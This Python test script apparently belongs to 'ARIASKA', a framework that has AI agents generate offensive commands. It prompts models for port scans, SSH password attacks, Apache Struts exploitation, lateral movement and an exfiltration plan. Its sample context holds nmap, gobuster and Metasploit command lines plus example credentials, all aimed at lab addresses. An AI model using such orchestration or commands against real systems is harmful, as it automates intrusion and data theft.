#!/usr/bin/env python3
# core/utils/test_llm_orchestration.py — ARIASKA LLM Orchestration Test
# Tests the complete LLM orchestration system with fallback chain, validation, and token efficiency

import os
import sys
import time
import json
from typing import Dict, Any, List
from pathlib import Path
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn

# Path handling for imports
sys.path.append(str(Path(__file__).resolve().parent.parent.parent))

# Import our LLM orchestration components
from core.utils.llm_router import LLMRouter, LLMModelType, CommandBase, ReconCommand
from core.utils.llm_integration import (
    request_tactical_command,
    request_recon_command,
    request_exploit_command,
    request_strategy,
    display_token_usage
)
from core.utils.local_llm_manager import LocalLLMManager, LocalLilyLLMManager, LocalSenecaLLMManager
from core.utils.context_encoder import ContextEncoder

console = Console()

def test_local_llm_managers():
    """Test the local LLM managers directly."""
    console.print("[bold cyan]Testing Local LLM Managers[/bold cyan]")
    
    # Test Lily LLM
    try:
        console.print("\n[bold]Testing Lily LLM...[/bold]")
        lily_llm = LocalLilyLLMManager()
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeElapsedColumn()
        ) as progress:
            task = progress.add_task("Querying Lily LLM...", total=1)
            
            result = lily_llm.query("Provide a command to scan a target host for open ports")
            
            progress.update(task, completed=1)
            
        console.print(f"[green]✓ Lily LLM Result:[/green] {result}")
    except Exception as e:
        console.print(f"[red]✗ Lily LLM Test Failed: {e}[/red]")
    
    # Test Seneca LLM
    try:
        console.print("\n[bold]Testing Seneca LLM...[/bold]")
        seneca_llm = LocalSenecaLLMManager()
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeElapsedColumn()
        ) as progress:
            task = progress.add_task("Querying Seneca LLM...", total=1)
            
            result = seneca_llm.query("Suggest a strategy to exploit a vulnerable web application")
            
            progress.update(task, completed=1)
            
        console.print(f"[green]✓ Seneca LLM Result:[/green] {result}")
    except Exception as e:
        console.print(f"[red]✗ Seneca LLM Test Failed: {e}[/red]")
    
    # Test JSON output
    try:
        console.print("\n[bold]Testing JSON output...[/bold]")
        llm = LocalLLMManager()
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeElapsedColumn()
        ) as progress:
            task = progress.add_task("Querying for JSON output...", total=1)
            
            success, result = llm.query_json(
                "Create a command to exploit the SSH service on 10.10.10.10",
                schema={"command": str, "target": str}
            )
            
            progress.update(task, completed=1)
            
        if success:
            console.print(f"[green]✓ JSON Result:[/green] {json.dumps(result, indent=2)}")
        else:
            console.print(f"[yellow]⚠ JSON extraction failed:[/yellow] {result}")
    except Exception as e:
        console.print(f"[red]✗ JSON Test Failed: {e}[/red]")

def test_llm_router():
    """Test the LLM Router with various roles and validation."""
    console.print("\n[bold magenta]Testing LLM Router[/bold magenta]")
    
    try:
        # Initialize router
        router = LLMRouter()
        
        test_prompts = [
            ("Scan the target network for open web servers", "tactical"),
            ("Find all WordPress installations on the target network", "recon"),
            ("Exploit the Apache Struts vulnerability on the target", "exploit"),
            ("Develop a strategy for post-exploitation", "strategic")
        ]
        
        for prompt, role in test_prompts:
            console.print(f"\n[bold]Testing {role} role...[/bold]")
            
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TimeElapsedColumn()
            ) as progress:
                task = progress.add_task(f"Routing {role} request...", total=1)
                
                context = {"targets": ["10.10.10.10"], "phase": "recon"}
                
                start = time.time()
                response = router.request(
                    prompt=prompt,
                    role=role,
                    context=context,
                    agent_id=f"test_{role}"
                )
                elapsed = time.time() - start
                
                progress.update(task, completed=1)
            
            console.print(f"[green]✓ {role.title()} Response ({response.model_used}, {elapsed:.2f}s):[/green] {response.content}")
            
            if response.parsed:
                console.print("[cyan]Structured data:[/cyan]")
                console.print(json.dumps(response.parsed, indent=2))
        
        # Display statistics
        router.display_stats()
        
    except Exception as e:
        console.print(f"[red]✗ LLM Router Test Failed: {e}[/red]")

def test_llm_integration():
    """Test the LLM Integration API with various request types."""
    console.print("\n[bold blue]Testing LLM Integration API[/bold blue]")
    
    try:
        # Test tactical command
        console.print("\n[bold]Testing tactical command...[/bold]")
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeElapsedColumn()
        ) as progress:
            task = progress.add_task("Requesting tactical command...", total=1)
            
            command = request_tactical_command(
                "Scan the target host for open ports",
                "TestAgent",
                {"targets": ["10.10.10.10"]}
            )
            
            progress.update(task, completed=1)
            
        console.print(f"[green]✓ Tactical Command:[/green] {command}")
        
        # Test recon command
        console.print("\n[bold]Testing recon command...[/bold]")
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeElapsedColumn()
        ) as progress:
            task = progress.add_task("Requesting recon command...", total=1)
            
            result = request_recon_command(
                "Find all WordPress installations on the target network",
                "ScoutAgent",
                ["10.10.10.0/24"],
                {"phase": "recon", "discovered_ports": [80, 443, 8080]}
            )
            
            progress.update(task, completed=1)
            
        console.print(f"[green]✓ Recon Command:[/green] {result}")
        
        # Test exploit command
        console.print("\n[bold]Testing exploit command...[/bold]")
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeElapsedColumn()
        ) as progress:
            task = progress.add_task("Requesting exploit command...", total=1)
            
            result = request_exploit_command(
                "Exploit the SSH service with password attack",
                "RedAgent",
                "10.10.10.10",
                "ssh",
                {"version": "OpenSSH 7.2p1"}
            )
            
            progress.update(task, completed=1)
            
        console.print(f"[green]✓ Exploit Command:[/green] {result}")
        
        # Test strategy
        console.print("\n[bold]Testing strategy request...[/bold]")
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeElapsedColumn()
        ) as progress:
            task = progress.add_task("Requesting strategy...", total=1)
            
            strategy = request_strategy(
                "Develop a strategy for lateral movement",
                "OrionAgent",
                {
                    "phase": "post_exploitation",
                    "privilege_level": "user",
                    "discovered_hosts": ["10.10.10.10", "10.10.10.15", "10.10.10.20"],
                    "exploited_hosts": ["10.10.10.10"]
                }
            )
            
            progress.update(task, completed=1)
            
        console.print(f"[green]✓ Strategy:[/green] {strategy}")
        
        # Display token usage
        display_token_usage()
        
    except Exception as e:
        console.print(f"[red]✗ LLM Integration Test Failed: {e}[/red]")

def test_context_encoder():
    """Test the Context Encoder for token efficiency."""
    console.print("\n[bold yellow]Testing Context Encoder for Token Efficiency[/bold yellow]")
    
    try:
        # Create a sample large context
        large_context = {
            "phase": "post_exploitation",
            "privilege_level": "user",
            "targets": ["10.10.10.10", "10.10.10.15", "10.10.10.20", "10.10.10.30", "10.10.10.40"],
            "ports": {
                "10.10.10.10": [22, 80, 443],
                "10.10.10.15": [22, 21, 3389],
                "10.10.10.20": [22, 445, 3306]
            },
            "services": {
                "10.10.10.10": {"22": "OpenSSH 7.2", "80": "Apache 2.4.29"},
                "10.10.10.15": {"22": "OpenSSH 8.1", "21": "vsftpd 3.0.3"}
            },
            "vulnerabilities": [
                "CVE-2017-5638: Apache Struts 2 Remote Code Execution",
                "CVE-2019-0708: BlueKeep RDP RCE",
                "CVE-2020-0796: SMBGhost"
            ],
            "credentials": {
                "10.10.10.10": {"user": "admin", "password": "Password123"},
                "10.10.10.15": {"user": "ftp_user", "password": "ftppass"}
            },
            "discovered_data": "Large amount of data that would consume many tokens and isn't necessary for most prompts",
            "scan_history": [
                "nmap -sS 10.10.10.0/24",
                "nmap -sV -p 22,80,443 10.10.10.10",
                "gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
            ],
            "exploit_history": [
                "searchsploit apache struts",
                "msfconsole -x 'use exploit/multi/http/struts2_content_type_ognl; set RHOSTS 10.10.10.10; set LHOST 10.10.10.5; run'"
            ],
            "alerts": 2,
            "exfiltrated_data_size": "4.2GB",
            "verbose_logs": "Very long string with detailed logs that would consume many tokens"
        }
        
        # Optimize context
        optimized = ContextEncoder.optimize_for_llm_prompt(large_context, max_chars=500)
        
        # Calculate reduction
        original_size = len(str(large_context))
        optimized_size = len(optimized)
        reduction_percent = (1 - (optimized_size / original_size)) * 100
        
        console.print(f"\n[bold]Original Context Size:[/bold] {original_size:,} characters")
        console.print(f"[bold]Optimized Context Size:[/bold] {optimized_size:,} characters")
        console.print(f"[bold]Reduction:[/bold] {reduction_percent:.1f}%")
        
        # Show the optimized context
        console.print("\n[bold]Optimized Context for LLM Prompt:[/bold]")
        console.print(Panel(optimized, expand=False))
        
    except Exception as e:
        console.print(f"[red]✗ Context Encoder Test Failed: {e}[/red]")

def test_fallback_chain():
    """Test the fallback chain mechanism."""
    console.print("\n[bold red]Testing Fallback Chain[/bold red]")
    
    try:
        router = LLMRouter()
        
        console.print("\n[bold]Testing fallback from local to cloud LLM...[/bold]")
        console.print("[yellow]Note: This test will intentionally trigger a fallback[/yellow]")
        
        # Create a complex prompt that's likely to make local LLMs struggle
        complex_prompt = (
            "Craft a highly sophisticated multi-stage attack plan that involves:\n"
            "1. Initial reconnaissance using both active and passive techniques\n"
            "2. Exploitation of web application vulnerabilities\n"
            "3. Privilege escalation via kernel exploitation\n"
            "4. Lateral movement using captured credentials\n"
            "5. Data exfiltration using steganography\n\n"
            "Include specific commands for each stage."
        )
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeElapsedColumn()
        ) as progress:
            task = progress.add_task("Testing fallback chain...", total=1)
            
            response = router.request(
                prompt=complex_prompt,
                role="strategic",
                agent_id="fallback_test",
                context={"phase": "planning", "targets": ["10.10.10.0/24"]}
            )
            
            progress.update(task, completed=1)
        
        console.print(f"[cyan]Used Model:[/cyan] {response.model_used}")
        console.print(f"[cyan]Fallbacks Used:[/cyan] {response.fallbacks_used}")
        console.print(f"[green]Response:[/green] {response.content[:300]}...")
        
    except Exception as e:
        console.print(f"[red]✗ Fallback Chain Test Failed: {e}[/red]")

def main():
    """Run all tests."""
    console.print(Panel.fit(
        "[bold]ARIASKA LLM Orchestration Test Suite[/bold]\n"
        "Testing the complete LLM orchestration system with fallback chain, validation, and token efficiency",
        title="🧠 Test Suite",
        border_style="cyan"
    ))
    
    # Run tests
    test_local_llm_managers()
    test_llm_router()
    test_llm_integration()
    test_context_encoder()
    test_fallback_chain()
    
    console.print("\n[bold green]✓ All tests completed![/bold green]")

if __name__ == "__main__":
    main()